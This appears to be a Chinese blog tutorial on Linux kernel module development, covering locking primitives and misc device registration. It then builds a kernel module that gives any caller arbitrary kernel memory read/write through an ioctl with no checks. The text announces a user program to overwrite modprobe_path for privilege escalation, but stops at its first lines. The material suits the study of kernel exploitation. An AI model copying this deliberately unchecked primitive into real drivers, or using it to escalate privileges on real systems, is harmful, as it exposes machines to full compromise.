<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">spinlock_t</span> my_lock;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止本地中断并加锁</span></span><br><span class="line">spin_lock_irqsave(&amp;my_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临界区代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解锁并恢复中断</span></span><br><span class="line">spin_unlock_irqrestore(&amp;my_lock, flags);</span><br></pre></td></tr></table></figure></div>

<h4 id="互斥锁（Mutexes）"><a href="#互斥锁（Mutexes）" class="headerlink" title="互斥锁（Mutexes）"></a>互斥锁（Mutexes）</h4><p><strong>互斥锁</strong>用于保护可以睡眠的临界区，适用于较长时间的锁定和需要进行可能睡眠操作的场景。互斥锁在请求锁的操作方式上分为<strong>阻塞式</strong>和<strong>非阻塞式</strong>两种。</p>
<p><code>mutex_lock</code> 是一个<strong>阻塞式</strong>操作，当一个线程调用 <code>mutex_lock()</code> 请求锁时，如果锁已经被其他线程占用，它<strong>会被挂起</strong>（阻塞），直到锁被释放。换句话说，当前线程会等待，直到它能够成功获取锁。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">my_mutex</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">mutex_init(&amp;my_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加锁</span></span><br><span class="line">mutex_lock(&amp;my_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临界区代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解锁</span></span><br><span class="line">mutex_unlock(&amp;my_mutex);</span><br></pre></td></tr></table></figure></div>

<p><code>mutex_trylock</code> 是一个 <strong>非阻塞式</strong> 操作。当线程调用 <code>mutex_trylock()</code> 请求锁时，它会尝试立即获取锁。</p>
<ul>
<li>如果锁当前没有被其他线程占用，<code>mutex_trylock()</code> 会返回成功（即获得锁）。</li>
<li>如果锁已经被其他线程占用，<code>mutex_trylock()</code> <strong>不会阻塞</strong>，它会立即返回 <code>-EBUSY</code>（即表示锁已经被占用），并且不会让当前线程挂起。调用者可以在返回失败时决定如何处理，比如立即返回、执行其他任务，或在稍后再次尝试获取锁。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">my_mutex</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">mutex_init(&amp;my_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试加锁（非阻塞）</span></span><br><span class="line"><span class="keyword">if</span> (mutex_trylock(&amp;my_mutex)) &#123;</span><br><span class="line">    <span class="comment">// 获取到锁，执行临界区代码</span></span><br><span class="line">    mutex_unlock(&amp;my_mutex);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 未获取到锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="读写锁（Read-Write-Locks）"><a href="#读写锁（Read-Write-Locks）" class="headerlink" title="读写锁（Read-Write Locks）"></a>读写锁（Read-Write Locks）</h4><p><strong>读写锁</strong>允许多个读者同时访问资源，但写者必须独占访问。适用于读操作多于写操作的场景。</p>
<p>读写锁有两个主要的操作类型：</p>
<ul>
<li><strong>读锁（Read Lock）</strong>：多个线程可以同时获取读锁进行读取操作。当一个线程获取了读锁后，其他线程也可以获取读锁，只要没有线程持有写锁。</li>
<li><strong>写锁（Write Lock）</strong>：写锁是独占的，只有一个线程可以持有写锁，而且在持有写锁时，其他线程既不能获得读锁也不能获得写锁。写锁用于修改共享数据，确保写入操作的原子性。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/rwlock.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义读写锁</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">DEFINE_RWLOCK</span><span class="params">(my_rwlock)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_function</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取读锁</span></span><br><span class="line">    read_lock(&amp;my_rwlock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行读操作</span></span><br><span class="line">    printk(<span class="string">&quot;Reading shared data...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放读锁</span></span><br><span class="line">    read_unlock(&amp;my_rwlock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_function</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取写锁</span></span><br><span class="line">    write_lock(&amp;my_rwlock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行写操作</span></span><br><span class="line">    printk(<span class="string">&quot;Writing shared data...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放写锁</span></span><br><span class="line">    write_unlock(&amp;my_rwlock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="信号量（Semaphores）"><a href="#信号量（Semaphores）" class="headerlink" title="信号量（Semaphores）"></a>信号量（Semaphores）</h4><p><strong>信号量</strong>用于控制多个执行上下文对共享资源的访问，表示资源的数量。适用于控制访问多个实例的资源。</p>
<p>信号量的工作机制主要包括 <strong>P操作</strong>（即 <code>down()</code> 或 <code>wait()</code>）和 <strong>V操作</strong>（即 <code>up()</code> 或 <code>signal()</code>）：</p>
<ul>
<li><strong>P操作（Proberen 或 Wait）</strong>：P操作尝试降低信号量的值。如果信号量的值大于零，它就会将值减一，表示有资源被占用，并允许线程继续执行。如果信号量的值为零，表示没有资源可用，线程会被挂起，直到信号量的值变为正数。</li>
<li><strong>V操作（Verhogen 或 Signal）</strong>：V操作增加信号量的值，表示资源被释放。当信号量的值从零增加时，操作系统会唤醒等待该信号量的线程，允许它们获取资源。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> <span class="title">my_sem</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化，设置信号量值为1（类似互斥锁）</span></span><br><span class="line">sema_init(&amp;my_sem, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取信号量（阻塞）</span></span><br><span class="line">down(&amp;my_sem);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临界区代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放信号量</span></span><br><span class="line">up(&amp;my_sem);</span><br></pre></td></tr></table></figure></div>

<h4 id="原子操作（Atomic-Operations）"><a href="#原子操作（Atomic-Operations）" class="headerlink" title="原子操作（Atomic Operations）"></a>原子操作（Atomic Operations）</h4><p><strong>原子操作</strong>用于执行无锁的原子操作，适用于简单的计数器或标志变量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">atomic_t</span> my_atomic;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化为0</span></span><br><span class="line"><span class="type">atomic_set</span>(&amp;my_atomic, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子加</span></span><br><span class="line"><span class="type">atomic_inc</span>(&amp;my_atomic);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子减</span></span><br><span class="line"><span class="type">atomic_dec</span>(&amp;my_atomic);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子读取</span></span><br><span class="line"><span class="type">int</span> val = <span class="type">atomic_read</span>(&amp;my_atomic);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子加并返回新值</span></span><br><span class="line"><span class="type">int</span> new_val = atomic_add_return(<span class="number">1</span>, &amp;my_atomic);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子减并返回新值</span></span><br><span class="line"><span class="type">int</span> new_val_dec = atomic_sub_return(<span class="number">1</span>, &amp;my_atomic);</span><br></pre></td></tr></table></figure></div>

<h2 id="设备模块开发"><a href="#设备模块开发" class="headerlink" title="设备模块开发"></a>设备模块开发</h2><p>前面开发的模块功能都十分单一，都只是在模块加载和卸载的时候调用了模块注册的加载和卸载函数，用户程序不能与这些模块进行交互。</p>
<p>为了实现更复杂的功能，我们要把模块开发成设备模块。设备模块通常会在文件系统中对应一个文件，并且在 VFS 中为这个文件注册一些文件处理函数。这样用户程序就可以通过 <code>open</code> 函数获取这个文件的描述符，然后通过一些列文件处理函数与内核模块进行交互，完成一些更复杂的功能。</p>
<p>在 Linux 内核中，设备分为多种类型，其中最常见的是 <strong>字符设备</strong> 和 <strong>块设备</strong>，这两种设备类型通常需要进行复杂的资源管理、设备号分配以及文件操作结构体的设置等。而 <code>misc</code> 设备提供了一种简单、便捷的方式来注册一个没有过多要求的设备。因此这里仅介绍 <code>misc</code> 设备的开发。</p>
<p>首先 MISC 设备需要我们创建 <code>miscdevice</code> 设备结构体。<code>miscdevice</code> 是 Linux 内核中定义的结构体，用于表示 <code>misc</code> 设备。在我们注册设备时，必须填充这个结构体。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>  &#123;</span></span><br><span class="line">	<span class="type">int</span> minor;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">fops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">this_device</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">attribute_group</span> **<span class="title">groups</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *nodename;</span><br><span class="line">	<span class="type">umode_t</span> mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>miscdevice</code> 结构体包含以下几个重要字段：</p>
<ul>
<li>**<code>name</code>**：设备名称，会在 <code>/dev</code> 目录下创建一个同名文件，用户程序通过这个文件与设备交互。</li>
<li>**<code>minor</code>**：次设备号，<code>MISC_DYNAMIC_MINOR</code> 表示让内核动态分配次设备号。</li>
<li>**<code>fops</code>**：设备操作函数表，通过这个表，内核知道该如何操作设备。</li>
</ul>
<p>这是我初始化的设备结构体，我将针对这个设备实现 <code>memrw_ioctl</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;memrw&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">memrw_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .unlocked_ioctl = memrw_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">memrw_device</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR, <span class="comment">// 动态分配次设备号</span></span><br><span class="line">    .name = DEVICE_NAME, <span class="comment">// 设备名称</span></span><br><span class="line">    .fops = &amp;memrw_fops, <span class="comment">// 文件操作结构体</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>之后在模块加载函数中通过 <code>misc_register</code> 函数将设备添加到内核的设备管理系统中。对于 MISC 设备内核会为设备自动分配设备号并在 <code>/dev</code> 目录下创建设备节点。（其他类型的设备在这一步需要根据设备号使用 <code>mknod</code> 命令手动在 <code>/dev</code> 目录下创建设备节点）</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">memrw_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[*] initializing memory read/write module\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ret = misc_register(&amp;memrw_device);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[-] failed to register misc device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[+] device %s registered successfully\n&quot;</span>, DEVICE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(memrw_init);</span><br></pre></td></tr></table></figure></div>

<p>在卸载函数中我们通过 <code>misc_deregister</code> 将该设备从内核的设备管理系统中移除。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static void __exit memrw_exit(void) &#123;</span><br><span class="line">    printk(KERN_INFO &quot;[+] exiting memory read/write module\n&quot;);</span><br><span class="line">    misc_deregister(&amp;memrw_device);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_exit(memrw_exit);</span><br></pre></td></tr></table></figure></div>

<p>剩下的部分就是实现注册在 <code>memrw_fops</code> 中的函数了，这里我实现的是任意地址读写的模块。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;memrw&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_READ_MEMORY 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_WRITE_MEMORY 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memrw_param</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *address;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">uint8_t</span> data[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">memrw_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">memrw_param</span> *<span class="title">param</span> =</span> kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> memrw_param), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(param, (<span class="keyword">struct</span> memrw_param *) arg, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> memrw_param))) &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[-] copy_from_user param error.\n&quot;</span>);</span><br><span class="line">        kfree(param);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    param = (<span class="keyword">struct</span> memrw_param *) krealloc(param, param-&gt;size + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> memrw_param), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> IOCTL_READ_MEMORY:</span><br><span class="line">            printk(KERN_INFO <span class="string">&quot;[*] read data from address: %#016llx with size: %zu\n&quot;</span>, param-&gt;address, param-&gt;size);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(param-&gt;data, param-&gt;address, param-&gt;size);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (copy_to_user(((<span class="keyword">struct</span> memrw_param *) arg)-&gt;data, param-&gt;data, param-&gt;size)) &#123;</span><br><span class="line">                printk(KERN_ERR <span class="string">&quot;[-] copy_to_user param error.\n&quot;</span>);</span><br><span class="line">                ret = -EFAULT;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> IOCTL_WRITE_MEMORY:</span><br><span class="line">            printk(KERN_INFO <span class="string">&quot;[*] write data to address: %#016llx with size: %zu\n&quot;</span>, param-&gt;address, param-&gt;size);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (copy_from_user(param-&gt;data, ((<span class="keyword">struct</span> memrw_param *) arg)-&gt;data, param-&gt;size)) &#123;</span><br><span class="line">                printk(KERN_ERR <span class="string">&quot;[-] copy_from_user param-&gt;data error.\n&quot;</span>);</span><br><span class="line">                ret = -EFAULT;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(param-&gt;address, param-&gt;data, param-&gt;size);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kfree(param);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">memrw_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .unlocked_ioctl = memrw_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">memrw_device</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR, <span class="comment">// 动态分配次设备号</span></span><br><span class="line">    .name = DEVICE_NAME, <span class="comment">// 设备名称</span></span><br><span class="line">    .fops = &amp;memrw_fops, <span class="comment">// 文件操作结构体</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">memrw_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[*] initializing memory read/write module\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = misc_register(&amp;memrw_device);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[-] failed to register misc device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[+] device %s registered successfully\n&quot;</span>, DEVICE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">memrw_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[+] exiting memory read/write module\n&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;memrw_device);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(memrw_init);</span><br><span class="line">module_exit(memrw_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>编写一个用户程序与内核交互实现修改 <code>modprobe_path</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 